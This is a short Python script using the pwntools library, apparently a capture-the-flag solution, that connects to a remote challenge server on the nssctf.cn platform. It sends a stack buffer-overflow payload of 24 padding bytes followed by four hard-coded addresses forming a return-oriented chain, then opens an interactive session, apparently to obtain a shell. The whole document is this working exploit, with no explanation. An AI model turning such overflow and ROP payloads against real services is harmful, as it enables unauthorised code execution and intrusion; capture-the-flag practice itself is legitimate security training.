from pwn  import *

# sh=process("./nss1")

sh = remote("node4.anna.nssctf.cn", 28307)
rbp = 0x7ffef0499990
rsp = 0x7ffef0499980

payload=b'A'*(16+8)+ p64(0x0000000000400673)+p64(0x00000000004006a6)+p64(0x0000000000400451)+p64(0x0000000000400480)
sh.sendline(payload)
sh.interactive()